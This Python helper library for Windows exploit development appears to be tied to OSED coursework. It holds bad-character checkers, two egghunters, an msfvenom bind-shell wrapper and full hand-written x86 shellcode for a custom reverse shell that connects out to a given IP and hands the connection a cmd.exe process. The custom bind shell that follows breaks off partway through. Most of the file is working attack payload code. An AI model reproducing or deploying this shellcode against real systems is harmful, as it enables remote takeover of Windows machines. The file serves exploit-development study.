#!/usr/bin/env python3

import time, os, traceback, sys, os
import pwn
import binascii, array
from struct import pack
from textwrap import wrap

def read_file_as_bytes(filepath):
  """Reads the contents of a file as a bytes object.

  Args:
    filepath: The path to the file.

  Returns:
    A bytes object containing the file's contents, or None if an error occurs.
  """
  try:
    with open(filepath, "rb") as f:
      return f.read()
  except FileNotFoundError:
    print(f"Error: File '{filepath}' not found.")
    return None
  except Exception as e:
    print(f"Error reading file '{filepath}': {e}")
    return None

def generate_all_hex_bytes():
  """Generates a list of all possible byte values in hexadecimal representation. Use for badchar generation.

  Returns:
    A list of two-digit hexadecimal bytes
  """
  hex_bytes = []
  for i in range(256):
    hex_bytes.append(bytes.fromhex(format(i, '02x')))
  return hex_bytes

def findBadChars(badchars, address):
    """ Send badchars as an escaped string \\x00. Address should be an integer"""
    badCharList = badchars.split("\\x")
    if address <= 0xffffffff:
       addrStr = "{:08x}".format(address)
    else:
       addrStr = "{:016x}".format(address)
    print(addrStr)
    addrList = [addrStr[i:i+2] for i in range(0, len(addrStr)-4, 2)]
    foundBadChars = list()
    for element in badCharList:
        if element in addrList:
           foundBadChars.append(element)
    #print(f"Found bad characters: {foundBadChars}")
    if not foundBadChars:
        return False
    else:
        return foundBadChars
def byteStreamCheck(badchars, byteStream):
    """Check for bad characters in a byte stream, return  offsets of the bad characters (ideally)"""
    foundBadChars = list()
    badCharBytes = list()
    badCharList = badchars.split("\\x")
    badCharList.pop(0)
    print(f"Bad Characters: {badCharList}")
    for element in badCharList:
        badCharBytes.append(bytes.fromhex(element))

    for element in badCharBytes:
        if element in byteStream:
            foundBadChars.append(element)
    if not foundBadChars:
        return False
    else:
        foundBadChars = [binascii.hexlify(item) for item in foundBadChars]
        print(f"Found Bad Characters: {foundBadChars}")
        return foundBadChars
#
# payloads
#

def create_pattern(size):
    """use msfpattern_create to create a string.  Takes in a length and returns the pattern."""
    # create pattern using msf-pattern_create to find offset
    myCMD = f"msf-pattern_create -l {size}"
    stream = os.popen(myCMD)
    myPattern = stream.read()
    myPattern = myPattern.strip().encode()
    return myPattern

def make_egg(eggID):
    """make an egghunter!  Takes in 4 ASCII bytes for the egg ID and return the shellcode identified should be in hex ascii, and be repeated twice
windows systems only"""

    pwn.info(f"Making egg with identifier {eggID}{eggID}")

    # make little endian
    eggID = eggID[::-1]
    hexEggID = binascii.hexlify(eggID).decode('ascii')
    pwn.info(f"Egg hex little Endian: {hexEggID}")

    # https://docs.pwntools.com/en/stable/asm.html
    pwn.context.clear()
    pwn.context.arch = 'i386'

    assembly = (
    # We use the edx register as a memory page counter
    "							 "
    "	loop_inc_page:			 "
            # Go to the last address in the memory page
    "		or dx, 0x0fff		;"
    "	loop_inc_one:			 "
            # Increase the memory counter by one
    "		inc edx				;"
    "	loop_check:				 "
            # Save the edx register which holds our memory 
            # address on the stack
    "		push edx			;"
            # Push the system call number (negative)
            # and reverse it
    "		push 0xfffffe3a		;"
    "       pop eax             ;"
    "       neg eax             ;"
            # Initialize the call to NtAccessCheckAndAuditAlarm
            # Perform the system call
    "		int 0x2e			;"
            # Check for access violation, 0xc0000005 
            # (ACCESS_VIOLATION)
    "		cmp al,05			;"
            # Restore the edx register to check later 
            # for our egg
    "		pop edx				;"
    "	loop_check_valid:		 "
            # If access violation encountered, go to n
            # ext page
    "		je loop_inc_page	;"
    "	is_egg:					 "
            # Load egg (w00t in this example) into 
            # the eax register
    f"		mov eax, 0x{hexEggID};"
            # Initializes pointer with current checked 
            # address 
    "		mov edi, edx		;"
            # Compare eax with doubleword at edi and 
            # set status flags
    "		scasd				;"
            # No match, we will increase our memory 
            # counter by one
    "		jnz loop_inc_one	;"
            # First part of the egg detected, check for 
            # the second part
    "		scasd				;"
            # No match, we found just a location 
            # with half an egg
    "		jnz loop_inc_one	;"
    "	matched:				 "
            # The edi register points to the first 
            # byte of our buffer, we can jump to it
    "		jmp edi				;"
    )

    # create shellcode that can be sent (bytes)
    shellcode = pwn.asm(assembly)

    # OPCodes as a string
    hexString = binascii.hexlify(shellcode).decode('utf-8')
    pwn.info(f"OPCodes: {hexString}")
    pwn.info(f"EggHunter Length: {len(shellcode)}")
    return shellcode
    # write to an executable ELF
    #myElf = pwn.ELF.from_assembly(assembly)
    #myElf.save('POC.elf')


def make_egg_SEH(eggID):
    """Improves upon the regular egghunter by using SEH. Takes in 4 ASCII bytes.  Larger payload!
    windows systems only"""

    pwn.info(f"Making SEH egg with identifier {eggID}{eggID}")

    # make little endian
    eggID = eggID[::-1]
    hexEggID = binascii.hexlify(eggID).decode('ascii')
    pwn.info(f"Egg hex little Endian: {hexEggID}")

    # https://docs.pwntools.com/en/stable/asm.html
    pwn.context.clear()
    pwn.context.arch = 'i386'

    assembly = (
"	start: 									 "
        # jump to a negative call to dynamically 
        # obtain egghunter position
"		jmp get_seh_address 				;"
"	build_exception_record: 				 "
        # pop the address of the exception_handler 
        # into ecx
"		pop ecx 							;"
        # mov signature into eax
f"		mov eax, 0x{hexEggID} 				;"
        # push Handler of the 
        # _EXCEPTION_REGISTRATION_RECORD structure
"		push ecx 							;"
        # push Next of the 
        # _EXCEPTION_REGISTRATION_RECORD structure
"		push 0xffffffff 					;"
        # null out ebx
"		xor ebx, ebx 						;"
        # overwrite ExceptionList in the TEB with a pointer
        # to our new _EXCEPTION_REGISTRATION_RECORD structure
"		mov dword ptr fs:[ebx], esp 		;"
        # subtract 0x4 from the pointer to exception handler
"       sub ecx, 0x4                        ;"
        # add 0x4 to ebx
"       add ebx, 0x4                        ;"
        # overwrite the StackBase in the TEB
"       mov dword ptr fs:[ebx], ecx         ;"
"	is_egg: 								 "
        # push 0x02
"		push 0x02 							;"
        # pop the value into ecx which will act 
        # as a counter
"		pop ecx 							;"
        # mov memory address into edi
"		mov edi, ebx 						;"
        # check for our signature, if the page is invalid we 
        # trigger an exception and jump to our exception_handler function
"		repe scasd 							;"
        # if we didn't find signature, increase ebx 
        # and repeat
"		jnz loop_inc_one 					;"
        # we found our signature and will jump to it
"		jmp edi 							;"
"	loop_inc_page: 							 "
        # if page is invalid the exception_handler will 
        # update eip to point here and we move to next page
"		or bx, 0xfff 						;"
"	loop_inc_one: 							 "
        # increase ebx by one byte
"		inc ebx 							;"
        # check for signature again
"		jmp is_egg 							;"
"	get_seh_address: 						 "
        # call to a higher address to avoid null bytes & push 
        # return to obtain egghunter position
"		call build_exception_record 		;"
        # push 0x0c onto the stack
"		push 0x0c 							;"
        # pop the value into ecx
"		pop ecx 							;"
        # mov into eax the pointer to the CONTEXT 
        # structure for our exception
"		mov eax, [esp+ecx] 					;"
        # mov 0xb8 into ecx which will act as an 
        # offset to the eip
"		mov cl, 0xb8						;"
        # increase the value of eip by 0x06 in our CONTEXT 
        # so it points to the "or bx, 0xfff" instruction 
        # to increase the memory page
"		add dword ptr ds:[eax+ecx], 0x06	;"
        # save return value into eax
"		pop eax 							;"
        # increase esp to clean the stack for our call
"		add esp, 0x10 						;"
        # push return value back into the stack
"		push eax 							;"
        # null out eax to simulate 
        # ExceptionContinueExecution return
"		xor eax, eax 						;"
        # return
"		ret 								;"
)

    # create shellcode that can be sent (bytes)
    shellcode = pwn.asm(assembly)

    # OPCodes as a string
    hexString = binascii.hexlify(shellcode).decode('utf-8')
    pwn.info(f"OPCodes: {hexString}")
    pwn.info(f"EggHunter Length: {len(shellcode)}")
    return shellcode
    # write to an executable ELF
    #myElf = pwn.ELF.from_assembly(assembly)
    #myElf.save('POC.elf')

def make_bindshell(badchars="none"):
    """Uses msfvenom to make a bindshell payload.  Send badcharacters as an escaped string"""
    # generate payload
    port = 4444
    pwn.info(f"Making bindshell on {port}.")
    pwn.info(f"Badchars are: {badchars}")
    payloadFileName = "payload.file"

    if badchars == "none":
        command = f'msfvenom -p windows/shell_bind_tcp LPORT=4444 -f raw > {payloadFileName}'
    else:
        command = f'msfvenom -p windows/shell_bind_tcp LPORT=4444 -b "{badchars}" -f raw > {payloadFileName}'
    pwn.info(f"Payload command string is: {command}")
    return_code = os.system(command)
    shellcode = read_file_as_bytes(payloadFileName)
    pwn.info(f"Shellcode length: {len(shellcode)}")
    return shellcode
def custom_win_rshell(ip,port):
    """Creates a custom windows reverse shell like in Section 7 of OSED.  Port & IP passed as strings."""
    # this is a little horrible, but it works to get the
    # port & IP vars into our shellcode correctly
    ipHex = []
    for number in ip.split("."):
        ipHex.append(str(hex(int(number))))
    ipHex = ipHex[::-1]
    ipHex = "".join(ipHex)
    ipHex = "".join(ipHex.split("0x")).upper()
    pwn.info(f"Creating custom Windows Reverse Shell with:")
    pwn.info(f"IP: {ip}")
    pwn.info(f"Port: {port}")
    pwn.debug(f"IP for shellcode: {ipHex}")
    portHex = hex(int(port))[2:]
    portHex = "".join(portHex.zfill(8).upper().split("00"))
    portHex = [portHex[i:i+2] for i in range(0, len(portHex), 2)]
    portHex = "".join(portHex[::-1])
    pwn.debug(f"Assembly Port to send: {portHex}")

    # https://docs.pwntools.com/en/stable/asm.html
    pwn.context.clear()
    pwn.context.arch = 'i386'
    assembly = (
    "start:"
    "   mov ebp, esp        ;" # emulate a function call
    "   add esp, 0xfffff9f0 ;" # subtract arbitrary offset so we don't clobber the stack, avoid null byte
    "find_kernel32:              " #
    "   xor ecx, ecx            ;" # zero ecx
    "   mov esi, fs:[ecx+0x30]   ;" # PEB address into ESI
    "   mov esi, [esi+0x0C]      ;" # PEB LDR DATA into ESI
    "   mov esi, [esi+0x1C]      ;" # InitializeationOrderModuleList into ESI (LDR DATA + 0x10)
    "next_module:                "
    "   mov ebx, [esi+0x8]       ;" # EBX = InInitOrder.base_address -> should be 0x18?
    "   mov edi, [esi+0x20]      ;" # EDI = InInitOrder.module_name
    "   mov esi, [esi]          ;" # ESI = InInitOrder.flink
    "   cmp [edi+12*2], cx      ;" # (unicode) modulename[12] == 0x00?
    "   jne next_module         ;" # No: try next module
    "find_function_shorten:     "
    "   jmp find_function_shorten_bnc ;" # short jmp
    "find_function_ret:"
    "   pop esi                 ;" # pop the return address from the stack
    "   mov [ebp+0x04],esi      ;" # save find_function addr for later
    "   jmp resolve_symbols_kernel32 ;"
    "find_function_shorten_bnc: "
    "   call find_function_ret  ;" # relative call with negative offset
    "find_function:             "
    "   pushad                  ;" # save all regs
    "   mov eax, [ebx+0x3c]     ;" # Offset to PE Signature
    "   mov edi, [ebx+eax+0x78] ;" # Export Table Directory RVA
    "   add edi, ebx            ;" # Export Table Directory VMA
    "   mov ecx, [edi+0x18]     ;" # NumberOfNames
    "   mov eax, [edi+0x20]    ;" # AddressOfNames RVA
    "   add eax, ebx            ;" # AddressOfNames VMA
    "   mov [ebp-4], eax        ;" # Save AddressOfNames VMA for later
    "find_function_loop:"
    "   jecxz find_function_finished;   " # Jump to the end if ecx/NumberOfNames=0
    "   dec ecx                 ;"
    "   mov eax, [ebp-4]        ;" # eax = AddressOfNames"
    "   mov esi, [eax+ecx*4]    ;" # Get the RVA of the symbol name
    "   add esi, ebx            ;" # ESI = VMA of the current sym name
    "compute_hash:              "
    "   xor eax, eax            ;" # Null EAX
    "   cdq                     ;" # null EDX
    "   cld                     ;" # clear direction
    "compute_hash_again:        "
    "   lodsb                   ;" # load the next byte from esi into al
    "   test al, al             ;" # check for null terminator
    "   jz compute_hash_finished;" # if zf set, we hit null
    "   ror edx, 0x0d           ;" # rotate edx 13 bits right
    "   add edx, eax            ;" # add the new byte to accumlator
    "   jmp compute_hash_again  ;" # next iteration
    "compute_hash_finished:     "  # hash stored in EDX
    "find_function_compare:     "
    "   cmp edx, [esp+0x24]     ;" # compare the computed hash with the requested hash
    "   jnz find_function_loop  ;" # go back if doesn't match
    "   mov edx, [edi+0x24]     ;" # AddressOfNameOrdinals RVA
    "   add edx, ebx            ;" # AddressOfNameOrdinals VMA
    "   mov cx, [edx+2*ecx]     ;" # Extrapolate the function's ordinal
    "   mov edx, [edi+0x1c]     ;" # AddressOfFunctions RVA
    "   add edx, ebx            ;" # AddressOfFunctions VMA
    "   mov eax, [edx+4*ecx]    ;" # Get the function RVA
    "   add eax, ebx            ;" # Get the function VMA
    "   mov [esp+0x1c], eax     ;" # overwrite stack version of eax from PUSHAD
    "find_function_finished:"
    "   popad                   ;"
    "   ret                     ;"
    "resolve_symbols_kernel32:"
    "   push 0x78b5b983     ;" # hash for "TerminateProcess"
    "   call dword ptr [ebp + 0x04]  ;" # call find_function
    "   mov [ebp+0x10],eax      ;" # Save TerminateProcessAddress for later
    "   push 0xec0e4e8e         ;" # hash for LoadLibraryA
    "   call dword ptr [ebp + 0x04]  ;" # call find_function
    "   mov [ebp+0x14], eax     ;" # save LoadLibraryA address for later
    "   push 0x16b3fe72         ;" # CreateProcessA hash
    "   call dword ptr [ebp + 0x04] ;"  # call find_function
    "   mov [ebp+0x18], eax     ;" # save CreateProcessA address for later
    "load_ws2_32:               " # string: ws2_32.dll via loadlibraryA
    "   xor eax, eax            ;" # null eax
    "   mov ax, 0x6c6c          ;" # move end of string into AX
    "   push eax                ;" # push eax on stack with string null terminator
    "   push 0x642e3233         ;" # part 1 of string
    "   push 0x5f327377         ;" # part 2 of string
    "   push esp                ;" # push ESP to have a pointer to the string
    "   call dword ptr[ebp+0x14];" # call LoadLibraryA (requires ptr to string)
    "resolve_symbols_ws2_32:    "
    "   mov ebx, eax            ;" # move base address of ws2_32 to EBX
    "   push 0x3bfcedcb         ;" # hash of WSAStartup
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x1c], eax     ;" # save WSAStartup address
    "   push 0xadf509d9         ;" # hash of WSASocketA
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x20], eax     ;" # save WSASocketA address
    "   push 0xb32dba0c         ;" # hash of WSAConnect
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x24], eax     ;" # save WSAConnect address
    "call_wsastartup:           "
    "   mov eax, esp            ;" # move esp to eax
    "   mov cx, 0x590           ;" # move 0x590 to cx
    "   sub eax, ecx            ;" # subtract cx from eax to avoid overwriting struct later
    "   push eax                ;" # (arg) push lpWSAData
    "   xor eax, eax            ;" # Null EAX
    "   mov ax, 0x0202          ;" # Move version to AX
    "   push eax                ;" # (arg) Push wVersionRequired
    "   call dword ptr[ebp+0x1c];" # call WSAStartup
    "call_wsasocketa:           "
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) dwFlags
    "   push eax                ;" # (arg) g
    "   push eax                ;" # (arg) lpProtocolInfo
    "   mov al, 0x06            ;" # move AL, IPPROTO_TCP
    "   push eax                ;" # (arg) protocol
    "   sub al, 0x05            ;" # get 1 in AL
    "   push eax                ;" # (arg) type
    "   inc eax                 ;" # eax=2
    "   push eax                ;" # (arg) af
    "   call dword ptr [ebp+0x20];"
    "call_wsaconnect:"
    "   mov esi, eax            ;" # move socket descriptor to ESI
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) sin_zero[]
    "   push eax                ;" # (arg) sin_zero[]
    f"  push 0x{ipHex}          ;" # (arg) IP Address
    f"  mov ax,0x{portHex}        ;" # port in hex
    "   shl eax, 0x10           ;" # shift eax left by 10 bits
    "   add ax, 0x02            ;" # add 0x02 (AF_INIT) to AX
    "   push eax                ;" # (arg) sin_port & sin_family
    "   push esp                ;" # (arg) pointer to sockaddr_instructure
    "   pop edi                 ;" # store pointer to sockaddr_in in EDI
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) lpGQOS
    "   push eax                ;" # (arg) lpSQOS
    "   push eax                ;" # (arg) lpCalleeData
    "   push eax                ;" # (arg) lpCallerData
    "   add al, 0x10            ;" # set AL to 0x10
    "   push eax                ;" # (arg) namelen
    "   push edi                ;" # (arg) *name
    "   push esi                ;" # (arg) s
    "   call dword ptr[ebp+0x24];" # call WSAConnect
    "create_startupInfoa:"
    "   push esi                ;" # (arg) hStdError->WSASocketHandle
    "   push esi                ;" # (arg) hStdOutput->WSASocketHandle
    "   push esi                ;" # (arg) hStdInput->WSASocketHandle
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) lpReserved2->NULL
    "   push eax                ;" # (arg) cbReserved2 & wShowWindow->NULL
    "   mov al, 0x80            ;" # move 0x80 into al
    "   add eax, eax            ;" # set EAX to 0x100 (avoid null)
    "   push eax                ;" # (arg) dwFlags -> 0x100
    "   xor eax, eax            ;"     #  Null EAX
    "   lea ecx, [eax + 0xA]    ;"     # set ECX to 10 with no nulls
    "   loop_start_startupinfo:"
    "       push eax        ;" #loop this
    "       loop loop_start_startupinfo ;" #back to loop, dec ecx
    #"   push eax                ;" # (arg) dwFillAttribute->null
    #"   push eax                ;" # (arg) dwYCountChars->null
    #"   push eax                ;" # (arg) dwXCountChars->null
    #"   push eax                ;" # (arg) dwYSize ->null
    #"   push eax                ;" # (arg) dwXSize ->null
    #"   push eax                ;" # (arg) dwY ->null
    #"   push eax                ;" # (arg) dwX ->null
    #"   push eax                ;" # (arg) lpTitle->null
    #"   push eax                ;" # (arg) lpDesktop->null
    #"   push eax                ;" # (arg) lpReserved->null
    "   mov al, 0x44            ;" # mov 0x44 into al
    "   push eax                ;" # (arg) cb -> 0x44
    "   push esp                ;" # (arg) pointer to STARTUPINFOA struct
    "   pop edi                 ;" # store pointer to STARTUPINFOA for later
    "create_cmd_string:         "
    "   mov eax, 0xff9a879b     ;" # negated cmd.exe string
    "   neg eax                 ;" # negate eax to create "exe" string
    "   push eax                ;" # (arg) first part of exe
    "   push 0x2e646d63         ;" # (arg) push remainder of cmd.
    "   push esp                ;" # (arg) push pointer to cmd.exe
    "   pop ebx                 ;" # store pointer to "cmd.exe" in EBX
    "call_createProcessa:"
    "   mov eax, esp            ;" # mov esp to eax
    "   xor ecx, ecx            ;" # zero ecx
    "   mov cx, 0x390           ;" # move 0x390 into cx
    "   sub eax, ecx            ;" # subtract CX from eax to avoid null
    "   push eax                ;" # (arg) lpProcessInformation, pointer populated by call
    "   push edi                ;" # (arg) lpStartupInfo pointer
    "   xor eax, eax            ;" # zero eax
    "   push eax                ;" # (arg) lpCurrentDirectory->null
    "   push eax                ;" # (arg) lpEnvironment ->null
    "   push eax                ;" # (arg) dwCreationFlags->null
    "   inc eax                 ;" # eax=1
    "   push eax                ;" # (arg) bInheritHandles->1 (yes)
    "   dec eax                 ;" # eax = 0
    "   push eax                ;" # (arg) lpThreadAttributes->null
    "   push eax                ;" # (arg) lpProcessAtributes->null
    "   push ebx                ;" # (arg) lpCommandLine->"cmd.exe" ptr
    "   push eax                ;" # (arg) lpApplicationName->null
    "   call dword ptr [ebp+0x18];"# call CreateProcessA
    "call_terminate_process:" # terminate things neatly to avoid a hang 
    "   xor eax, eax        ;" # re-zero because calls populate eax
    "   push eax            ;" # (arg) uExitCode-> Null
    "   push 0xffffffff     ;" # (arg) hProcess -> current process pseudohandle
    "   call dword ptr [ebp+0x10];" # Call TerminateProcess
    )
       # create shellcode that can be sent (bytes)
    shellcode = pwn.asm(assembly)

    # OPCodes as a string
    hexString = binascii.hexlify(shellcode).decode('utf-8')
    pwn.info(f"OPCodes: {hexString}")
    pwn.info(f"Shellcode Length: {len(shellcode)}")
    # write to an executable ELF
    #myElf = pwn.ELF.from_assembly(assembly)
    #myElf.save('POC.elf')
    return shellcode

def custom_win_bindshell(port):
    """Creates a custom windows bind shell (extra mile OSED).  Port passed as string."""
    # this is a little horrible, but it works to get the
    # port & IP vars into our shellcode correctly
    pwn.info(f"Creating custom Windows Bind Shell with:")
    pwn.info("Listening on all interfaces.")
    pwn.info(f"Port: {port}")
    portHex = hex(int(port))[2:]
    portHex = "".join(portHex.zfill(8).upper().split("00"))
    portHex = [portHex[i:i+2] for i in range(0, len(portHex), 2)]
    portHex = "".join(portHex[::-1])
    pwn.debug(f"Assembly Port to send: {portHex}")

    # https://docs.pwntools.com/en/stable/asm.html
    pwn.context.clear()
    pwn.context.arch = 'i386'
    assembly = (
    "start:"
    "   mov ebp, esp        ;" # emulate a function call
    "   add esp, 0xfffff9f0 ;" # subtract arbitrary offset so we don't clobber the stack, avoid null byte
    "find_kernel32:              " #
    "   xor ecx, ecx            ;" # zero ecx
    "   mov esi, fs:[ecx+0x30]   ;" # PEB address into ESI
    "   mov esi, [esi+0x0C]      ;" # PEB LDR DATA into ESI
    "   mov esi, [esi+0x1C]      ;" # InitializeationOrderModuleList into ESI (LDR DATA + 0x10)
    "next_module:                "
    "   mov ebx, [esi+0x8]       ;" # EBX = InInitOrder.base_address -> should be 0x18?
    "   mov edi, [esi+0x20]      ;" # EDI = InInitOrder.module_name
    "   mov esi, [esi]          ;" # ESI = InInitOrder.flink
    "   cmp [edi+12*2], cx      ;" # (unicode) modulename[12] == 0x00?
    "   jne next_module         ;" # No: try next module
    "find_function_shorten:     "
    "   jmp find_function_shorten_bnc ;" # short jmp
    "find_function_ret:"
    "   pop esi                 ;" # pop the return address from the stack
    "   mov [ebp+0x04],esi      ;" # save find_function addr for later
    "   jmp resolve_symbols_kernel32 ;"
    "find_function_shorten_bnc: "
    "   call find_function_ret  ;" # relative call with negative offset
    "find_function:             "
    "   pushad                  ;" # save all regs
    "   mov eax, [ebx+0x3c]     ;" # Offset to PE Signature
    "   mov edi, [ebx+eax+0x78] ;" # Export Table Directory RVA
    "   add edi, ebx            ;" # Export Table Directory VMA
    "   mov ecx, [edi+0x18]     ;" # NumberOfNames
    "   mov eax, [edi+0x20]    ;" # AddressOfNames RVA
    "   add eax, ebx            ;" # AddressOfNames VMA
    "   mov [ebp-4], eax        ;" # Save AddressOfNames VMA for later
    "find_function_loop:"
    "   jecxz find_function_finished;   " # Jump to the end if ecx/NumberOfNames=0
    "   dec ecx                 ;"
    "   mov eax, [ebp-4]        ;" # eax = AddressOfNames"
    "   mov esi, [eax+ecx*4]    ;" # Get the RVA of the symbol name
    "   add esi, ebx            ;" # ESI = VMA of the current sym name
    "compute_hash:              "
    "   xor eax, eax            ;" # Null EAX
    "   cdq                     ;" # null EDX
    "   cld                     ;" # clear direction
    "compute_hash_again:        "
    "   lodsb                   ;" # load the next byte from esi into al
    "   test al, al             ;" # check for null terminator
    "   jz compute_hash_finished;" # if zf set, we hit null
    "   ror edx, 0x0d           ;" # rotate edx 13 bits right
    "   add edx, eax            ;" # add the new byte to accumlator
    "   jmp compute_hash_again  ;" # next iteration
    "compute_hash_finished:     "  # hash stored in EDX
    "find_function_compare:     "
    "   cmp edx, [esp+0x24]     ;" # compare the computed hash with the requested hash
    "   jnz find_function_loop  ;" # go back if doesn't match
    "   mov edx, [edi+0x24]     ;" # AddressOfNameOrdinals RVA
    "   add edx, ebx            ;" # AddressOfNameOrdinals VMA
    "   mov cx, [edx+2*ecx]     ;" # Extrapolate the function's ordinal
    "   mov edx, [edi+0x1c]     ;" # AddressOfFunctions RVA
    "   add edx, ebx            ;" # AddressOfFunctions VMA
    "   mov eax, [edx+4*ecx]    ;" # Get the function RVA
    "   add eax, ebx            ;" # Get the function VMA
    "   mov [esp+0x1c], eax     ;" # overwrite stack version of eax from PUSHAD
    "find_function_finished:"
    "   popad                   ;"
    "   ret                     ;"
    "resolve_symbols_kernel32:"
    "   push 0x78b5b983     ;" # hash for "TerminateProcess"
    "   call dword ptr [ebp + 0x04]  ;" # call find_function
    "   mov [ebp+0x10],eax      ;" # Save TerminateProcessAddress for later
    "   push 0xec0e4e8e         ;" # hash for LoadLibraryA
    "   call dword ptr [ebp + 0x04]  ;" # call find_function
    "   mov [ebp+0x14], eax     ;" # save LoadLibraryA address for later
    "   push 0x16b3fe72         ;" # CreateProcessA hash
    "   call dword ptr [ebp + 0x04] ;"  # call find_function
    "   mov [ebp+0x18], eax     ;" # save CreateProcessA address for later
    "load_ws2_32:               " # string: ws2_32.dll via loadlibraryA
    "   xor eax, eax            ;" # null eax
    "   mov ax, 0x6c6c          ;" # move end of string into AX
    "   push eax                ;" # push eax on stack with string null terminator
    "   push 0x642e3233         ;" # part 1 of string
    "   push 0x5f327377         ;" # part 2 of string
    "   push esp                ;" # push ESP to have a pointer to the string
    "   call dword ptr[ebp+0x14];" # call LoadLibraryA (requires ptr to string)
    "resolve_symbols_ws2_32:    "
    "   mov ebx, eax            ;" # move base address of ws2_32 to EBX
    "   push 0x3bfcedcb         ;" # hash of WSAStartup
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x1c], eax     ;" # save WSAStartup address
    "   push 0xadf509d9         ;" # hash of WSASocketA
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x20], eax     ;" # save WSASocketA address
    "   push 0xb32dba0c         ;" # hash of WSAConnect
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x24], eax     ;" # save WSAConnect address
    "   push 0xc7701aa4         ;" # hash for bind()
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x28], eax     ;"  # save bind address for later
    "   push 0x492f0b6e         ;"  # hash for socket()
    "   call dword ptr [ebp+0x04];" # call find_function"
    "   mov [ebp+0x2c], eax     ;"  # save socket address for later
    "   push 0xe92eada4         ;"  # push listen hash
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x30], eax     ;" # store listen for later
    "   push 0x498649e5         ;" # hash for accept()
    "   call dword ptr [ebp+0x04];" # call find_function
    "   mov [ebp+0x34], eax     ;" # store accept for later
    "call_wsastartup:           "
    "   mov eax, esp            ;" # move esp to eax
    "   mov cx, 0x590           ;" # move 0x590 to cx
    "   sub eax, ecx            ;" # subtract cx from eax to avoid overwriting struct later
    "   push eax                ;" # (arg) push lpWSAData
    "   xor eax, eax            ;" # Null EAX
    "   mov ax, 0x0202          ;" # Move version to AX
    "   push eax                ;" # (arg) Push wVersionRequired
    "   call dword ptr[ebp+0x1c];" # call WSAStartup
    #"call_socket:               "
    #"   xor eax, eax            ;" # null eax
    #"   push eax                ;" # (arg) Protocol, 0 for TCP
    #"   inc eax                 ;" # eax=1
    #"   push eax                ;" # (arg) Socket Type = SOCK_STREAM = 1
    #"   inc eax                 ;" # eax=2
    #"   push eax                ;" # (arg) Address family (AF_INET)
    #"   call dword ptr[ebp+0x2c];" # call socket
    "call_wsasocketa:           "
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) dwFlags
    "   push eax                ;" # (arg) g
    "   push eax                ;" # (arg) lpProtocolInfo
    "   mov al, 0x06            ;" # move AL, IPPROTO_TCP
    "   push eax                ;" # (arg) protocol
    "   sub al, 0x05            ;" # get 1 in AL
    "   push eax                ;" # (arg) type
    "   inc eax                 ;" # eax=2
    "   push eax                ;" # (arg) af
    "   call dword ptr [ebp+0x20];"
    "bind:"
    "   mov esi, eax            ;" # move socket descriptor to ESI
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) sin_zero[]
    "   push eax                ;" # (arg) sin_zero[]
    f"  push eax                ;" # (arg) IP Address->NULL for all
    f"  mov ax,0x{portHex}        ;" # port in hex
    "   shl eax, 0x10           ;" # shift eax left by 10 bits
    "   add ax, 0x02            ;" # add 0x02 (AF_INIT) to AX
    "   push eax                ;" # (arg) sin_port & sin_family
    "   push esp                ;" # (arg) pointer to sockaddr structure
    "   pop edi                 ;" # store pointer to sockaddr_in in EDI
    "   xor eax, eax            ;" # null eax
    "   add al, 0x10            ;" # set AL to 0x10
    "   push eax                ;" # (arg) sizeof(sockaddr_in)-> 0x10
    "   push edi                ;" # (arg) *namesockaddr -> sock_addr_in struct
    "   push esi                ;" # (arg) s -> socket desc in ESI
    "   call dword ptr[ebp+0x28];" # call bind (socket, dockaddr, int namelen)
    "listen:"
    "   xor eax, eax            ;" # NULL EAX to be safe
    "   mov al, 0x80            ;" # set EAX to 128 (0x80)
    "   push eax                ;" # (arg) backlock = 128
    "   push esi                ;" # (arg) socket descriptor
    "   call dword ptr [ebp+0x30];" # call listen()
    "accept:"
    "   xor eax, eax            ;" # null EAX
    "   push eax                ;" # (arg) sockaddr struc 0
    "   push eax                ;" # (arg) addrlen 0
    "   push esi                ;" # (arg) socket descriptor
    "   call dword ptr [ebp+0x34];" # call accept()
    "   mov esi, eax            ;" # ESI=new socket for connection
    "create_startupInfoa:"
    "   push esi                ;" # (arg) hStdError->socket
    "   push esi                ;" # (arg) hStdOutput->socket
    "   push esi                ;" # (arg) hStdInput->socket
    "   xor eax, eax            ;" # null eax
    "   push eax                ;" # (arg) lpReserved2->NULL
    "   push eax                ;" # (arg) cbReserved2 & wShowWindow->NULL
    "   mov al, 0x80            ;" # move 0x80 into al
    "   add eax, eax            ;" # set EAX to 0x100, avoid nulls
    "   push eax                ;" # (arg) dwFlags -> 0x100
    "   xor eax, eax            ;" #  Null EAX
    "   lea ecx, [eax + 0xA]    ;" # set ECX to 10 with no nulls, loop counter
    "   loop_start_startupinfo:"
    "       push eax        ;" #loop this
    "       loop loop_start_startupinfo ;" #back to loop, dec ecx
    #"   push eax                ;" # (arg) dwFillAttribute->null
    #"   push eax                ;" # (arg) dwYCountChars->null
    #"   push eax                ;" # (arg) dwXCountChars->null
    #"   push eax                ;" # (arg) dwYSize ->null
    #"   push eax                ;" # (arg) dwXSize ->null
    #"   push eax                ;" # (arg) dwY ->null
    #"   push eax                ;" # (arg) dwX ->null
    #"   push eax                ;" # (arg) lpTitle->null
    #"   push eax                ;" # (arg) lpDesktop->null
    #"   push eax                ;" # (arg) lpReserved->null
    "   mov al, 0x44            ;" # mov 0x44 into al
    "   push eax                ;" # (arg) cb -> 0x44
    "   push esp                ;" # (arg) pointer to STARTUPINFOA struct
    "   pop edi                 ;" # EDI=ptr(STARTUPINFOA) for later
    "create_cmd_string:         "
    "   mov eax, 0xff9a879b     ;" # negated exe_ string
    "   neg eax                 ;" # negate eax to create "exe" string
    "   push eax                ;" # (arg) first part of exe
    "   push 0x2e646d63         ;" # (arg) push remainder of cmd.
